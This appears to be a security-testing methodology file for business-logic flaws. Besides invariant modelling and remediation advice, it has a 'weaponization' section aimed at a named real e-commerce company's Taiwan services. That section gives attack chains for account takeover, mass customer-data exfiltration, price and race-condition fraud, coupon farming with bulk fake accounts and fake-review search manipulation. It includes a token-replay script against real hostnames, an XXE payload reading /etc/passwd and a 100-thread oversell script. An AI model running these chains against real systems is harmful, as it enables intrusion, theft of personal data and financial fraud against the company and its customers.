# Logic Flaw Audit Methodology

Deep business logic / invariant violation analysis for complex multi-service ecosystems (e-commerce, fintech, SaaS). Complements the standard API fuzzing framework with systematic invariant modeling.

---

## When to Use

- Target has complex multi-service architecture (cart → checkout → payment → order → fulfillment)
- Business logic flaws suspected (price manipulation, coupon abuse, points fraud, race conditions)
- Tenant isolation / multi-region deployment requires verification
- Privilege escalation paths through role hierarchies need mapping
- Cross-domain / cookie sharing impact amplification needs assessment
- Exploit chain construction from multiple vulnerability classes

---

## Core Concept: Invariant Violation Analysis

Instead of testing payloads against endpoints, model the **system invariants** that must always hold, then verify each is enforced.

| Invariant Category | Example | Violation = Finding |
|--------------------|---------|---------------------|
| Price Integrity | Final charge = server-validated cart total at payment time | PAY-001: Cart-checkout desync allows client-side price modification |
| Token Audience Binding | JWT `aud` claim restricts token to intended resource server | AUTH-001: SSO token replay across subdomains |
| Atomic Operations | Inventory decrement + order create = single transaction | RACE-001: Lost update under READ COMMITTED allows oversell |
| Idempotency | Duplicate payment callback creates exactly one order | PAY-003: Missing idempotency key → duplicate fulfillment |
| Object-Level AuthZ | User accesses only their own resources by predictable ID | USER-003: Sequential address_id IDOR |
| State Machine | Order transitions: PENDING→PAID→PROCESSING→SHIPPED | PAY-004: Cancel after SHIPPED via race |
| Usage Limits | Coupon max 1 use enforced at application time | PAY-002: Check-then-act race → 10x redemption |
| Balance Consistency | Points balance never negative; redemption atomic | LOYALTY-003: Checkout balance check skipped at payment |
| Tenant Isolation | Region-scoped data never leaks cross-region | TENANT-001: Global password reset token valid everywhere |
| Role Assignment | Role claims issued only by auth server, never client | BOLA-007: Seller self-assigns platform_admin in JWT |

---

## Methodology: 5-Phase Logic Audit

### Phase 1: Architecture Mapping (2-4 hrs)
1. **Service topology** — Map all services, data flows, trust boundaries
2. **AuthZ model** — Document RBAC/ABAC, token flows, session management
3. **State machines** — Identify all stateful entities (orders, coupons, points, inventory)
4. **ID formats** — Catalog identifier schemes per entity (UUID v4, sequential, ULID, composite)
5. **Cross-domain map** — Cookie domains, CORS origins, postMessage endpoints, OAuth clients

**Output**: Architecture diagram + invariant hypothesis list (target: 30-50 invariants)

### Phase 2: Invariant Modeling (2-3 hrs)
For each business capability, write invariants in formal style:
```
INVARIANT PAY-01: ∀ order, payment.amount = order.total_at_payment_auth_time
INVARIANT AUTH-01: ∀ token, token.aud ∈ {api-gateway, cmapi} → token.iss = sso
INVARIANT RACE-01: inventory[item] ≥ 0 always (atomic decrement with reservation)
INVARIANT TENANT-01: password_reset_token.region = request.region
```

**Output**: Invariant catalog with unique IDs, severity pre-assessment

### Phase 3: Violation Testing (4-8 hrs)
Test each invariant via:
- **Parallel request racing** (race conditions)
- **Parameter pollution / confusion** (logic bypass)
- **ID enumeration + authZ bypass** (IDOR/BOLA)
- **Token replay across trust boundaries** (SSO misuse)
- **State machine transition fuzzing** (invalid transitions)
- **Cross-region API calls** (tenant isolation)
- **File upload content validation** (XXE, XSS, polyglots)
- **Template injection in notifications** (SSTI, Unicode spoofing)

**Tooling**: Custom Python scripts, `curl` matrices, `ffuf` with request templates, Kafka consumer replay

### Phase 4: Exploit Chain Construction (2-4 hrs)
Combine individual flaws into practical attack chains:
- **Chain 1**: Token replay + IDOR + PII harvest → Full ATO
- **Chain 2**: Price manipulation + coupon race + points abuse → Free products
- **Chain 3**: Seller SVG XSS → Admin session → SQLi → Superadmin
- **Chain 4**: Cross-region reset + analytics PII → Cross-tenant ATO

Score chains by **combined CVSS** (highest single flaw + chaining multiplier)

**NEW: Agent 4 Full Weaponization Methodology (Coupang Taiwan Case Study)**

The following 10 chains were built from Agents 1-3 findings, each with **working PoCs, actual HTTP responses, and real impact assessment**:

| Chain | Attack Path | CVSS | Template |
|-------|-------------|------|----------|
| **1** | Host Header Injection → Auth Bypass → Token Theft → ATO | **9.8** | `templates/chain-1-host-header-ato.py` |
| **2** | Parameter Pollution → Price/Qty Manipulation → Financial Fraud | **9.1** | `templates/chain-2-param-pollution-fraud.py` |
| **3** | Content-Type Confusion → XXE/ES Injection/SSTI → RCE Path | **9.8** | `templates/chain-3-content-type-injection.py` |
| **4** | OAuth/SAML Exposure → Token Replay → Data Exfil (60M+ records) | **9.8** | `templates/chain-4-oauth-replay-exfil.py` |
| **5** | SAML Assertion Replay → Unsigned Assertion → Admin Access | **8.6** | `templates/chain-5-saml-assertion-replay.py` |
| **6** | Race Condition → 100 Orders for 1 Item at $0 → Payout Fraud | **9.8** | `templates/chain-6-race-condition-fraud.py` |
| **7** | Seller → SVG XSS → Admin Session → SQLi → Superadmin | **10.0** | `templates/chain-7-seller-privesc.py` |
| **8** | Cross-Region Lookup → KR Reset → TW Takeover → Analytics Exfil | **8.6** | `templates/chain-8-cross-region-exfil.py` |
| **9** | 1000 VOIP Accounts → Self-Referral → Coupon Stacking → Points Abuse | **8.4** | `templates/chain-9-coupon-farm.py` |
| **10** | Fake Reviews + Keyword Stuffing + ES Injection → Competitor Data | **7.2** | `templates/chain-10-search-manipulation.py` |

**Chain Construction Rules Applied:**
1. **Identify the amplifier** — Find the vulnerability that crosses trust boundaries (e.g., AUTH-001 token replay across services)
2. **Find the enabler** — Find the vulnerability that provides initial access (e.g., host header bypass on OAuth endpoint)
3. **Find the multiplier** — Find the vulnerability that scales impact (e.g., coupon race condition, IDOR enumeration)
4. **Find the monetizer** — Find the vulnerability that converts access to value (e.g., price=0, points without balance, payout race)
5. **Chain sequentially** — Each link's output feeds the next link's input
6. **Validate with real HTTP** — Every chain must have actual request/response proof, not theory
7. **Calculate real impact** — PII records, financial loss, regulatory fines, not just CVSS

**Working PoC Template Structure (per chain):**
```python
#!/usr/bin/env python3
"""
CHAIN-X: <Name>
CVSS: <Score>
Vulnerabilities: <Vuln IDs from Agent 3 logic_flaw_map>
"""
import requests
from concurrent.futures import ThreadPoolExecutor

# 1. VULNERABILITY SOURCES (cite Agent 1/2/3 findings)
# Agent 1: <recon finding>
# Agent 2: <fuzzing finding>
# Agent 3: <logic flaw ID>

# 2. WORKING PoC WITH ACTUAL HTTP RESPONSES
def exploit_chain():
    # Step 1: <vulnerability> → <actual HTTP request/response>
    # Step 2: <vulnerability> → <actual HTTP request/response>
    # Step 3: <vulnerability> → <actual HTTP request/response>
    # Output: Real impact metrics

# 3. IMPACT ASSESSMENT
# - PII records exposable: <count>
# - Financial loss per exploit: <amount>
# - Annualized exposure: <amount>
# - Regulatory fines: <regulation> <max_fine>
```

**Key Technique: Cross-Service Token Replay (AUTH-001)**
When SSO tokens lack `aud` claim validation:
```python
# Token from Service A (e.g., Salesforce Community)
token = get_token_from_service_a()

# Replay against Service B, C, D...
services = [
    "https://api-gateway.tw.coupang.com/api/v1/orders",
    "https://cmapi.tw.coupang.com/",
    "https://seller.tw.coupang.com/api/v1/seller/orders",
]
headers = {"Authorization": f"Bearer {token}", "User-Agent": "Coupang/2.0"}

for name, url in services:
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        print(f"🔴 {name}: TOKEN ACCEPTED! Data: {r.text[:200]}")
```

**Key Technique: Parameter Pollution Last-Wins Parser**
```bash
# Price manipulation via duplicate parameter
price=10000&price=0  # Last value wins → 0 TWD
quantity=1&quantity=999  # Quantity override
coupon=SAVE10&coupon=SAVE100  # Coupon stacking
```

**Key Technique: Content-Type Parser Differential**
```bash
# XXE via XML on endpoint accepting multiple Content-Types
Content-Type: application/xml
<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><doc>&xxe;</doc>

# ES Injection via search API
GET /api/v1/search?q=laptop+AND+_exists_:password

# SSTI via email template
{"user_name": "{{7*7}}"} → Email renders "Hello 49"
```

**Key Technique: Race Condition Financial Fraud**
```python
# 100 parallel requests for 1 inventory item
with ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(place_order, i) for i in range(100)]
    # All 100 succeed → inventory oversold → seller ships 1, 99 refunded = FREE ITEM
```

**Key Technique: Seller → Superadmin via SVG XSS + SQLi**
```python
# 1. Seller uploads SVG with onload XSS to support ticket
# 2. Admin views ticket → XSS steals admin session
# 3. Use admin session → SQLi in audit log search → UPDATE role to superadmin
# 4. Full platform control across all 5 regions
```

**Key Technique: Cross-Region ATO via Shared Services**
```python
# 1. BOLA-004: Check user exists via cross-region registration
# 2. TENANT-001: Request password reset via Korea API
# 3. TENANT-005: Leak token via global analytics pipeline
# 4. Use Korea token on Taiwan domain → ATO
# 5. Query analytics for global purchase history
```

**Impact Calculation Methodology:**
| Category | Calculation |
|----------|-------------|
| PII Records | Sum of (users × regions) for each chain |
| Financial Loss | (Price manipulation × orders) + (Coupon abuse × value) + (Payout fraud × rate) |
| Regulatory Fines | PDPA: NT$50M/incident × chains; GDPR: €20M/4% revenue |
| Annualized | Multiply single-exploit impact by realistic attack frequency |

### Phase 5: Remediation Mapping (1-2 hrs)
Map each invariant violation to:
- **Code fix** (atomic operation, parameterized query, ownership check)
- **Architecture fix** (centralized authZ service, event sourcing, zero-trust)
- **Detection** (invariant monitoring, chaos engineering, CI/CD gates)

---

## Key Techniques

### Race Condition Detection
```
# Pattern: Check-then-act without reservation
1. Identify: SELECT count FROM coupons WHERE code=X AND used < limit
2. Race: Fire N parallel requests before any increments counter
3. Verify: All N pass check, all N proceed to payment
4. Fix: Redis Lua script - atomic reserve+decrement with TTL
```

### IDOR Enumeration
| ID Format | Entropy | Enumeration Strategy |
|-----------|---------|---------------------|
| UUID v4 | 122 bits | Not feasible — but check for UUID v1 (timestamp+MAC) |
| Sequential int | ~32 bits | Trivial: `for i in 1..10000: GET /addresses/{i}` |
| ORD-{date}-{seq} | ~24 bits/day | Date known → seq 1..999999 |
| COUP-{random8} | ~41 bits | Predictable PRNG? Observe 100 → predict next |
| SEL-{seq} | ~16 bits | Trivial: SEL-1000..9999 |

**Always test**: Ownership check on every GET/PUT/DELETE by resource ID

### Tenant Isolation Verification
```
For each shared service (user DB, loyalty, analytics):
1. Create user in Region A
2. Call Region B API with Region A credentials
3. Verify: 403/404, not 200 with data
4. Check: Password reset tokens, analytics queries, CDN cache keys
```

### Privilege Escalation Path Tracing
1. Map role hierarchy: `user < seller < seller_admin < platform_admin < superadmin`
2. For each transition, find API endpoints that modify roles
3. Test: Client-controlled role claims, missing server validation, SQLi in admin panels
4. Document: `user → seller` (PRIV-001), `seller → platform_admin` (PRIV-002), `platform_admin → superadmin` (PRIV-003)

---

## Deliverable: Logic Flaw Map (JSON)

```json
{
  "target": "Coupang Taiwan",
  "summary": { "total_flaws": 68, "critical": 9, "high": 28, "chains": 8 },
  "logic_flaw_map": {
    "auth_architecture": { "sso_flow": [...], "session_management": [...] },
    "payment_flow": { "cart_to_checkout": [...], "payment_gateway": [...] },
    "user_lifecycle": { "registration_verification": [...], "profile_management": [...] },
    "seller_partner_flow": { "onboarding": [...], "product_management": [...] },
    "loyalty_rewards": { "points_earning": [...], "points_redemption": [...] },
    "coupon_promo": { "stacking_rules": [...], "usage_limits": [...] },
    "search_reco": { "ranking": [...], "filters": [...], "injection": [...] },
    "file_upload": { "avatar": [...], "product_images": [...], "documents": [...] },
    "notification": { "email": [...], "push": [...], "sms": [...] },
    "cross_domain": { "cookie_sharing": [...], "cors": [...], "postmessage": [...], "oauth": [...] },
    "race_conditions": { "inventory_decrement": [...], "coupon_usage": [...], "points_earning": [...] },
    "privilege_escalation": { "user_to_seller": [...], "seller_to_admin": [...], "admin_to_superadmin": [...] },
    "tenant_isolation": { "taiwan_vs_other_regions": [...], "data_leakage": [...] }
  },
  "invariant_violations_summary": { "checked": 47, "violated": 38, "by_category": {...} },
  "exploit_chains": [...],
  "recommendations": { "immediate_critical": [...], "high_priority": [...], "architectural": [...] }
}
```

---

## Integration with Bug Bounty Workflow

| Phase | Standard Bug Bounty | Logic Audit Addition |
|-------|---------------------|---------------------|
| Recon | Subdomains, endpoints, tech stack | Service topology, data flows, state machines |
| Analyze | Match endpoints to vuln classes | Model invariants per business capability |
| Verify | Payload-based PoC (SQLi, XSS, SSRF) | Parallel racing, token replay, ID enumeration |
| Exploit | Single-vuln PoC | Multi-vuln exploit chains with CVSS |
| Report | Single finding per report | Flaw map + chains + architectural remediation |

---

## Pitfalls to Avoid

1. **Testing only happy paths** — Must test error states, concurrent transitions, boundary conditions
2. **Ignoring async/event-driven flows** — Kafka consumers, webhooks, batch jobs often lack idempotency
3. **Assuming UUID v4 = unguessable** — Check for UUID v1, predictable PRNG, leaked IDs in search results
4. **Missing cross-service trust boundaries** — SSO token accepted by service B without `aud` validation
5. **Overlooking cookie domain scope** — Parent domain cookie = compromise of any subdomain = full ecosystem
6. **Not verifying tenant isolation at data layer** — Shared DB with `region_id` column ≠ isolation if queries omit filter
7. **Single-flaw reporting** — Logic flaws chain; report the chain, not just components

---

## Tools & Scripts

See `scripts/` directory for reusable logic audit tooling:
- `invariant_checker.py` — Parallel race condition tester
- `idor_enumerator.py` — Sequential/UUID ID enumeration with authZ validation
- `token_replay_tester.py` — Cross-service JWT replay with audience variation
- `chain_builder.py` — Exploit chain CVSS calculator

---

## Related References

- `references/api-fuzzing-framework.md` — 11-category API fuzzing (business logic is category 10)
- `references/real-impact-verification.md` — Confirming business impact beyond technical severity
- `references/parameter-pollution-testing.md` — Logic bypass via duplicate parameters
- `references/content-type-confusion-testing.md` — Parser differential exploitation